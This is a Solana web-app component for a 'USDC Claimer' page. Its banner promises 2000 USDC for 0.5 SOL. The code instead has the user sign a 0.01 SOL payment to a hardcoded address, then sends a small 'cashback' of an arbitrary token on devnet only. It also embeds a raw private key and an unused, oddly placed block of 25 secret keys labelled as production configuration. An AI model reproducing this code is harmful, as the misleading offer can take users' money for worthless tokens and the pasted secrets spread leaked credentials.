/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "xAnBMmgEhvjNrViv8GtmVDeYva7JCrHm9eGvita8b4LuStQ3MxAPbTSioGBAqAgE59CabKRYbJuKXuEriLcVeed"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4Zj3wZLEg8ykMFDQgW1JRb6CUpi9PRL8fSAz6Y7qbp3XsukPXcbYXcwKYvKqRBCUyjWgfrorhBmXr9MrZ2dkQcp1",
  "key1": "5THJwPeHtFysb9XBWqkV7HnZT94aqswBLzgxXueA9ddr851Sbbvj3kuxKMgz8onk9XmSpHcQXNpFcKYbcCU1CoWQ",
  "key2": "2jGkndcrqBAF2oWdBc7kq3vzpgsF5E8tWvHJWKqEaqmLCdKJyVAocRzZkkg62H8C4Lh3ZdCHGyxcr3XFZe5DWvw5",
  "key3": "5MPLJAsjt6jzBRDpc4g4qyWKQcnYxAYK1gYgE3nr8ZQYZGAq5HCjmdWZ88ooRA6DypgFd32KaePZMEK2kFiAuLoV",
  "key4": "2ZaDUre7dRreH3VnqpTeZ81QWShxK6qcDBTkXQzoL79nkNyVjh5s369T9eHRqkqTHuKKZSnZjm8X7HfK66ejPyfb",
  "key5": "5yCvYkdTBBny8xQC4qhd8DRB8pLaT5Xhh1UHXCbV177TPNRn4K141hbUwoU8nv78Mt5Zks5ZMMASYP2kRjHheLLU",
  "key6": "3T5TFiRgjYPiXythjePtSe8i9cn8nnh7tKWEkxBFSoNaRYcLakTwPdGKjM8BYWEXdm4QFrVNhNwttiwfaXcKftzz",
  "key7": "2iDXj2y9vAs1iSj37k4g5sfBmsTLp4SrFEi5otw8AqP4ShSH53Rzat4QQg1qhaPCriXPRWsJkE2LpPGBiUo5nVcz",
  "key8": "37RWkVTNq7PJJNSg4LQbH9yaBMEPxp8vMRfeHo6p2XpK7KuN9RQBPKgmxzsmrEGQJBqRJLrqBWGUWAQS3jYfGtEn",
  "key9": "5A3WTqijbNJUaA4SLEemgLijH4Ju678hnQg4Fun7tTYdyJr7pi3aeJP5ns1gRbT3NXavqABAfDZwrj6q2Uja9iKp",
  "key10": "3izkkGuKMNkABz2na3i7g2uB9GFdtv7s8MxoEoBr9hNKsMYk7LCbwcoAVoEmDKo8htxg3RBZYPQQrmoQ7VKczRAF",
  "key11": "5S3JGDttNLzREiUPFVPA14dR5uEH5Za8zeR7DGJ86brccx3mrVvZpjEX5TSTc5E7Wy4mZUDh21Bcq6YQ9TdZCNq2",
  "key12": "3wB1M1y5HcqnzVK4PBaERvwMQgwCfWRGNtU23fnujYSqQ1fJ2pay6v2efCxJmZP8ZyPfiJ9pcDVfLzAZqfBWNs5i",
  "key13": "2CBA6dMa1JE3J41uc2EECaXQ3jot4VwJhNA87ePszxE9nGQZAyQdTHv8VPkrGssoogqGjBT9JdDi5r8x6Jw1wenV",
  "key14": "4BmzCntTX5bwr933RbCXc2qUp5coC12xv9UPDue8XjgPM1MfFuECxZrHLb9mHGNAJoo5sWn4LjuDJq4SHDxdYDt6",
  "key15": "4rEkktF69i1LCCe3H8tTM44Fi2Mi2at3baSkTGRmQJJuvtS7NWtzWX72f7DnLtKRqxsrmBM3fWMRQNjeGt6smVA",
  "key16": "4krYpnSpRpdnEZwvDY6xAXFGMKEhLeFGHqpAViiaKxfGZLzMsawkFwz1tBoArWSfxCddrzHtFCDgA2rN9dYkfgae",
  "key17": "5oLwxKCFgyeDsRBd5zPo9vVAdwwfRXbxuEPbft7fw8dTtskBaL7Tmp3GNpdp7P8WTFGwqKbLyLZFTp8PiQ56gCuM",
  "key18": "25CBXoggjE863o6thtnNJmiwCq3MMhXS9zNvNp8KPDcPJ5VS3fK9Q2xtY5gEw7pB131frVxduUvRXhggtR2qh8sz",
  "key19": "4pRGCULF9bH67QZ669akpfzKrxJiKqrrnzkHJWbP81rCTaaXpR6B7YouzAZvny9RRjyMa1SELEPAeiYXzxuqJacx",
  "key20": "t6VJnkeKgXQ45nyhAnCUYrNhtZbWhMrPCF7n2MkqgAaG3A9YgHuLpZqSdzgiJLueifKuxpdB5MSPsSQ7Hkak1zZ",
  "key21": "tZBXTXNpyjAxndNg2pcZYo3fe94EAqNuJpMe7xCA1XTegTnJkRujYa6RRVpkDi9wpS9sjeg3bVV8oLLPdNaaN45",
  "key22": "4h2hk2KqSGTCDiB1qaJRHUBZrDEprtfCxFW4rFFZGsevwPGDPMn7Q2JEpVyQPjaDrt8fsycnvGpvsfVkPGfHPtyE",
  "key23": "7oaWNS8fXxYNHTAhdoQE2iiNoTDW4qndEw9Zo69LKNABNLuk3rEv1nkJT9Mc5axB8zX8kYYVMhDQBwQmVPW86VA",
  "key24": "5KojLyZ1c173s5YQ27Hcg8rMrTP2qPc86TVC89QDzHUvuEjPd4eRTA8UDDUxMxaCPYoS3EitH48AgeiqRhTnh1a9"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
